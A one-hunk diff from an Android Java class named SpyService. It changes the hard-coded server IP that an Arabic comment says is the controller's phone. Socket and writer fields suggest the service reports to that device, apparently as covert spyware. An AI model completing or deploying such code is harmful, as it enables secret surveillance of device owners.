@@ -64,7 +64,7 @@ public class SpyService extends Service {
     private boolean foregroundStarted = false;
 
     // ====== اتصال الخادم ======
-    private static final String SERVER_IP = "192.168.1.100"; // غيّر إلى IP هاتف المدير
+    private static final String SERVER_IP = "10.35.72.53"; // غيّر إلى IP هاتف المدير
     private static final int SERVER_PORT = 8080;
     private Socket socket;
     private PrintWriter out;
